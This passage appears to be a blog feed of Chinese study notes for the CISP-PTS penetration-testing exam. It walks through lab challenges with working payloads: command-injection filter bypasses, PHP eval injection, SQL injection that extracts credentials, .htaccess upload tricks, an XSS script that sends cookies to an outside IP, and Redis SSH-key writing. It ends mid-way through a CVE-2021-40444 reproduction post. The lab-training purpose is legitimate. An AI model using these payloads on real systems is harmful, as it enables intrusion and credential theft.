src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171116984.png" alt="image-20211217171116984"></p><h3 id="12-17-1"><a href="#12-17-1" class="headerlink" title="12.17"></a>12.17</h3><p>直接读</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172232781.png" alt="image-20211217172232781"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="12-15-1"><a href="#12-15-1" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210650348.png" alt="image-20211215210650348"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210730452.png" alt="image-20211215210730452"></p><p>屏蔽了cat\tac\less\tail\tailf\more\nl\head命令，用单引号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.p&#39;h&#39;p</span><br><span class="line">127.0.0.1|c&#39;a&#39;t &#x2F;var&#x2F;www&#x2F;html&#x2F;key*</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211022077.png" alt="image-20211215211022077"></p><h3 id="12-17-2"><a href="#12-17-2" class="headerlink" title="12.17"></a>12.17</h3><p>就那样</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172400840.png" alt="image-20211217172400840"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172418591.png" alt="image-20211217172418591"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="12-15-2"><a href="#12-15-2" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211305385.png" alt="image-20211215211305385"></p><p>寻找返回码200的</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211457942.png" alt="image-20211215211457942"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211516286.png" alt="image-20211215211516286"></p><h3 id="12-26"><a href="#12-26" class="headerlink" title="12.26"></a>12.26</h3><p>文件-导出对象-HTTP-Save即可获取该压缩包</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226163404733.png" alt="image-20211226163404733"></p><p>打开需要密码</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226163438837.png" alt="image-20211226163438837"></p><p>wireshark字符串搜索该压缩包名称</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226163606347.png" alt="image-20211226163606347"></p><p>找到解压密码 Adm1n!，打开就是key</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226163725234.png" alt="image-20211226163725234"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="12-14"><a href="#12-14" class="headerlink" title="12.14"></a>12.14</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211620111.png" alt="image-20211215211620111"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line">    &#x2F;*</span><br><span class="line">    Hint:</span><br><span class="line">    get the shell find the key；）\n&quot;;</span><br><span class="line">    *&#x2F;</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;&#39; . md5(&quot;cisp-pts&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);&#x2F;&#x2F;拼接出来一个目录，&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;[cisp-pts27.18.46.118]的md5&#x2F;</span><br><span class="line">    @mkdir($sandbox,0777,true);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    echo strlen($_GET[&#39;cmd&#39;]);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 30) &#123;&#x2F;&#x2F;如果cmd长度小于30就执行cmd命令，用ecoho分步写马到txt，写到txt是为了方便检查，最后mv成php即可。</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">echo &quot;&lt;br &#x2F;&gt; IP : &#123;$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br></pre></td></tr></table></figure><p>路径/usr/local/apache2/htdocs/sandbox/76d99222ba0ed30738b2490dc59580a5/，注意计算md5时echo用-n，即结尾不要回车符，不然就计算的是[cisp-pts27.18.46.118回车符]的md5，不一样了。</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212429380.png" alt="image-20211215212429380"></p><p>验证路径，403证明存在</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212628060.png" alt="image-20211215212628060"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212647613.png" alt="image-20211215212647613"></p><p>尝试执行个命令通过echo到静态文件看结果</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213209377.png" alt="image-20211215213209377"></p><p>分步写马</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213332252.png" alt="image-20211215213332252"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213417163.png" alt="image-20211215213417163"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213456376.png" alt="image-20211215213456376"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213542399.png" alt="image-20211215213542399"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213614591.png" alt="image-20211215213614591"></p><p>最后mv成一个php即可</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213957099.png" alt="image-20211215213957099"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213816292.png" alt="image-20211215213816292"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215214148169.png" alt="image-20211215214148169"></p><h3 id="12-25"><a href="#12-25" class="headerlink" title="12.25"></a>12.25</h3><p>题目和上面一样，有一点，当无法用linux计算md5时可以用burp的爆破模块计算md5</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226162443626.png" alt="image-20211226162443626"></p><h3 id="12-16-1"><a href="#12-16-1" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$PTE &#x3D; &quot;CISP-PTE&quot;;</span><br><span class="line">$str &#x3D; $_GET[&#39;str&#39;];</span><br><span class="line">if (unserialize($str) &#x3D;&#x3D;&#x3D; &quot;$PTE&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$key4&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__); </span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235642320.png" alt="image-20211216235642320"></p><p>这种反序列化不需要class名和属性名，只需要属性值即可</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235916385.png" alt="image-20211216235916385"></p><h3 id="12-17-3"><a href="#12-17-3" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171246145.png" alt="image-20211217171246145"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">eval(&quot;\$o&#x3D;strtolower(\&quot;$a\&quot;);&quot;);</span><br><span class="line">echo $o;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>网上查的，没理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">闭合的方式绕过执行：view-source:http:&#x2F;&#x2F;150.158.27.164:1084&#x2F;start&#x2F;vul.php?a&#x3D;aa&quot;);system(&quot;cat key4.php&quot;);&#x2F;&#x2F;</span><br><span class="line">urly Syntax 漏洞利用：view-source:http:&#x2F;&#x2F;150.158.27.164:1084&#x2F;start&#x2F;vul.php?a&#x3D;$&#123;system(&quot;cat key4.php&quot;)&#125;</span><br><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:1084&#x2F;start&#x2F;vul.php?a&#x3D;$&#123;readfile(&quot;key4.php&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171332547.png" alt="image-20211217171332547"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="12-16-2"><a href="#12-16-2" class="headerlink" title="12.16"></a>12.16</h3><p>过滤了注释符</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231442543.png" alt="image-20211216231442543"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231500469.png" alt="image-20211216231500469"></p><p>绕过方式-#-就变成了–</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232120351.png" alt="image-20211216232120351"></p><p>文章列表效果</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232144069.png" alt="image-20211216232144069"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#39;,database(),&#39;cc&#39;)-#- +         &#x2F;&#x2F;cc是对应的用户名</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232333273.png" alt="image-20211216232333273"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232349579.png" alt="image-20211216232349579"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zz&#39;,(select group_concat(schema_name) from information_schema.schemata),&#39;cc&#39;)-#- + &#x2F;&#x2F;查询所有库名</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233039048.png" alt="image-20211216233039048"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z2&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;2web&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233706223.png" alt="image-20211216233706223"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233721138.png" alt="image-20211216233721138"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z3&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users1&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234348598.png" alt="image-20211216234348598"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234401233.png" alt="image-20211216234401233"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z4&#39;,(select concat(username,password) from users1 limit 0,1),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234533676.png" alt="image-20211216234533676"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234545499.png" alt="image-20211216234545499"></p><h3 id="12-17-4"><a href="#12-17-4" class="headerlink" title="12.17"></a>12.17</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了空格，尝试用&#x2F;**&#x2F;,0x0a,0x0b,0x0c,0x0d,()绕过，发现0x0b绕过</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170508907.png" alt="image-20211217170508907"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170545321.png" alt="image-20211217170545321"></p><h3 id="12-17-5"><a href="#12-17-5" class="headerlink" title="12.17"></a>12.17</h3><p>真的难，id是base64加密，这很容易发现，关键是不知道哪些字符是被过滤的，下图显示的是不加密的数据。</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172709310.png" alt="image-20211217172709310"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172734526.png" alt="image-20211217172734526"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172758818.png" alt="image-20211217172758818"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172826891.png" alt="image-20211217172826891"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="12-16-3"><a href="#12-16-3" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">后缀名&#x2F;&#x2F;大小写，php345,00截断，htaccess,.user.ini</span><br><span class="line">content-type</span><br><span class="line">文件头&#x2F;&#x2F;GIF89a</span><br><span class="line">文件内容关键字检查&#x2F;&#x2F; &lt;?php $_REQUEST[1]($_REQUEST[2]); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235028920.png" alt="image-20211216235028920"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235040145.png" alt="image-20211216235040145"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235114127.png" alt="image-20211216235114127"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235137544.png" alt="image-20211216235137544"></p><h3 id="12-17-6"><a href="#12-17-6" class="headerlink" title="12.17"></a>12.17</h3><p>未发现新点</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170821160.png" alt="image-20211217170821160"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170841548.png" alt="image-20211217170841548"></p><h3 id="12-17-7"><a href="#12-17-7" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171556631.png" alt="image-20211217171556631"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $files[&quot;name&quot;];</span><br><span class="line">$randnum &#x3D; rand(1, 99999);</span><br><span class="line">$fullpath &#x3D; &#39;&#x2F;&#39; . md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;) + 1);&#x2F;&#x2F;shell名为md5(文件全名+rand(1,99999)).php,后半段.substr($filename,strripos($filename,&#39;.&#39;) + 1)总是返回后缀名</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171641792.png" alt="image-20211217171641792"></p><p>生成字典</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171941519.png" alt="image-20211217171941519"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172000987.png" alt="image-20211217172000987"></p><p>爆破</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172022858.png" alt="image-20211217172022858"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172106460.png" alt="image-20211217172106460"></p><p>另外一种用burp爆破路径的方法</p><p>1到100000就是范围，step是每隔几个</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211219204141297.png" alt="image-20211219204141297"></p><p>这里Prefix就是前缀也就是shell名字</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211219204159576.png" alt="image-20211219204159576"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211219204215912.png" alt="image-20211219204215912"></p><h3 id="12-25-1"><a href="#12-25-1" class="headerlink" title="12.25"></a>12.25</h3><p>文件上传，考验htaccess，可以从php345多试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php3 &#x2F;&#x2F;所有文件当作php3解析，下面同理</span><br><span class="line">SetHandler application&#x2F;x-httpd-php4</span><br><span class="line">SetHandler application&#x2F;x-httpd-php5</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg &#x2F;&#x2F;jpg当作php解析，下面同理</span><br><span class="line">AddType application&#x2F;x-httpd-php3 .jpg</span><br><span class="line">AddType application&#x2F;x-httpd-php4 .jpg</span><br><span class="line">AddType application&#x2F;x-httpd-php5 .jpg</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;aa&quot;&gt; &#x2F;&#x2F;aa后缀文件当作php解析</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="12-16-4"><a href="#12-16-4" class="headerlink" title="12.16"></a>12.16</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000009524.png" alt="image-20211217000009524"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000046096.png" alt="image-20211217000046096"></p><p>false改true，Username的base64解密是guest，改admin即可</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000209761.png" alt="image-20211217000209761"></p><h3 id="12-17-8"><a href="#12-17-8" class="headerlink" title="12.17"></a>12.17</h3><p>和12.16一样</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="12-25-2"><a href="#12-25-2" class="headerlink" title="12.25"></a>12.25</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226161935158.png" alt="image-20211226161935158"></p><p>直接扫目录，发现DS_Store和<a href="http://www.rar/">www.rar</a></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226162027541.png" alt="image-20211226162027541"></p><p>打开<a href="http://www.rar获得提示/">www.rar获得提示</a></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226162124834.png" alt="image-20211226162124834"></p><p>如果知道后缀，直接访问swp文件，如果不知道，也可以用ds_store恢复</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226162227895.png" alt="image-20211226162227895"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226162308223.png" alt="image-20211226162308223"></p><h2 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h2><h3 id="12-25-1"><a href="#12-25-1" class="headerlink" title="12.25-1"></a>12.25-1</h3><p>有个留言界面，利用xss获取管理员cookie</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226163845584.png" alt="image-20211226163845584"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;23.91.97.29:92&#x2F;?cookie&#x3D;&#39;+document.cookie+&#39;&quot; &#x2F;&gt;&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226164219894.png" alt="image-20211226164219894"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226164338580.png" alt="image-20211226164338580"></p><p>考试时都是内网，无法使用vps监听，所以考试时在本地监听</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226164654032.png" alt="image-20211226164654032"></p><p>用cookie访问admin获得第一个cookie</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226165806803.png" alt="image-20211226165806803"></p><p>sql注入过滤了空格，用/**/替换，读取key，考试时会提示key位置</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226165929447.png" alt="image-20211226165929447"></p><p>文件包含读key3</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170003273.png" alt="image-20211226170003273"></p><h3 id="12-25-2"><a href="#12-25-2" class="headerlink" title="12.25-2"></a>12.25-2</h3><p>考ssrf和redis，扫描路径获得提示backup.zip，提示5562端口</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170206190.png" alt="image-20211226170206190"></p><p>要是127.0.0.1过滤，可以用localhost</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170337655.png" alt="image-20211226170337655"></p><p>同时提示redis端口，利用redis未授权访问写ssh公私钥，建议telnet和putty写</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170609621.png" alt="image-20211226170609621"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170708040.png" alt="image-20211226170708040"></p><p>puttygen.exe Generate滑动鼠标生成密钥</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170827958.png" alt="image-20211226170827958"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226170955207.png" alt="image-20211226170955207"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171021159.png" alt="image-20211226171021159"></p><p>然后用putty连接，puttygen.exe生成private key</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171154631.png" alt="image-20211226171154631"></p><p>putty设置</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171257145.png" alt="image-20211226171257145"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171322005.png" alt="image-20211226171322005"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171402395.png" alt="image-20211226171402395"></p><p>连接成功</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171416142.png" alt="image-20211226171416142"></p><p>计划任务一个key</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171500300.png" alt="image-20211226171500300"></p><p>查找网站下两个key</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171543052.png" alt="image-20211226171543052"></p><p>其他解法1：提示key位置，然后用ssrf和file协议读取key</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171743487.png" alt="image-20211226171743487"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171832891.png" alt="image-20211226171832891"></p><p>其他解法2：读取httpd.conf </p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211226171954383.png" alt="image-20211226171954383"></p><p>找到网站路径/var/www/html/app1</p><p>然后用redis写webshell到网站路径下</p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211227103010930.png" alt="image-20211227103010930"></p><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211227103025739.png" alt="image-20211227103025739"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 考证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软MSHTML引擎CVE-2021-40444漏洞复现</title>
      <link href="2021/09/27/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/09/27/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2021年9月8日，微软发布安全通告披露了Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的 Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码。</span><br><span class="line"></span><br><span class="line">MSHTML(又称为Trident)是微软旗下的Internet Explorer浏览器引擎，也用于Office应用程序，以在Word、Excel或PowerPoint文档中呈现Web托管的内容，AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。</span><br></pre></td></tr></table></figure><h2 id="POC地址"><a href="#POC地址" class="headerlink" title="POC地址"></a>POC地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lockedbyte&#x2F;CVE-2021-40444</span><br></pre></td></tr></table></figure><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docx改zip</span><br><span class="line">\word\_rels\document.xml.rels</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927113823630.png" alt="image-20210927113823630"></p><h2 id="利用要安装lcab"><a href="#利用要安装lcab" class="headerlink" title="利用要安装lcab"></a>利用要安装lcab</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">920  wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gz</span><br><span class="line">921  tar zxvf lcab_1.0b12.orig.tar.gz</span><br><span class="line">922  cd lcab-1.0b12</span><br><span class="line">923  .&#x2F;configure </span><br><span class="line">924  make</span><br><span class="line">925  make install</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927115551022.png" alt="image-20210927115551022"></p><p>这玩意儿貌似默认开启的</p><p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122439455.png" alt="image-20210927122439455"></p><h2 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 